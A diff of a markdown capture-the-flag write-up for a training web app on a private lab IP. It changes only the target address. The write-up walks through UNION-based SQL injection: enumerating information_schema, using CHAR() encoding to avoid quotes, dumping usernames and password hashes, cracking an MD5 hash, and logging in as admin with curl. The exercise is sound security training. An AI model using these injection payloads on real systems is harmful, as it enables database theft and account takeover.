@@ -1,14 +1,14 @@
 # SignIn Page
 
-__http://192.168.99.101/index.php?page=signin__
+__http://192.168.56.101/index.php?page=signin__
 
 ## Description
 This page show sign in form with username and password fields.
 
 ## Form Outputs
-The [page](#http://192.168.99.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit) return the list of members
+The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit) return the list of members
 We should use injections again
-[select schema_name, 0 from information_schema.schemata](#http://192.168.99.101/index.php?page=member&id=-1%20union%20select%20schema_name,%200%20from%20information_schema.schemata&Submit=Submit)
+[select schema_name, 0 from information_schema.schemata](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20schema_name,%200%20from%20information_schema.schemata&Submit=Submit)
 ```
 ID: -1 union select schema_name, 0 from information_schema.schemata 
 First name: information_schema
@@ -45,7 +45,7 @@ Firstly we need ASCII orders of the Member_Brute_Force chars
 ``` 
 instead of using in select where table_schema='Member_Brute_Force'
 
-we will request [select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.99.101/index.php?page=member&id=-1%20union%20select%20table_name,0%20from%20information_schema.tables%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)
+we will request [select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20table_name,0%20from%20information_schema.tables%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)
 
 we get the page with database db_default
 ```
@@ -53,7 +53,7 @@ ID: -1 union select table_name,0 from information_schema.tables where table_sche
 First name: db_default
 Surname : 0
 ```
-[select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.99.101/index.php?page=member&id=-1%20union%20select%20column_name,0%20from%20information_schema.columns%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)
+[select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20column_name,0%20from%20information_schema.columns%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)
 ```
 ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
 First name: id
@@ -70,7 +70,7 @@ we get columns:
 2. username
 3. password
 
-Let's check users [select username, password from Member_Brute_Force.db_default&Submit=Submit](#http://192.168.99.101/index.php?page=member&id=-1%20union%20select%20username,%20password%20from%20Member_Brute_Force.db_default&Submit=Submit)
+Let's check users [select username, password from Member_Brute_Force.db_default&Submit=Submit](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20username,%20password%20from%20Member_Brute_Force.db_default&Submit=Submit)
 
 ```
 ID: -1 union select username, password from Member_Brute_Force.db_default 
@@ -86,8 +86,8 @@ Surname is the same. Let's use the info
 The flag we've got is [shadow](#https://md5.gromweb.com/?md5=3bf1114a986ba87ed28fc1b5884fc2f8)
 
 ```
-curl -s 'http://192.168.99.101/index.php?page=signin&username=admin&password=dummy&Login=Login' -o dummy.html
-curl -s 'http://192.168.99.101/index.php?page=signin&username=admin&password=shadow&Login=Login' -o admin.html
+curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=dummy&Login=Login' -o dummy.html
+curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=shadow&Login=Login' -o admin.html
 diff admin.html dummy.html 
 ```
 Inside the diff output html we get the flag
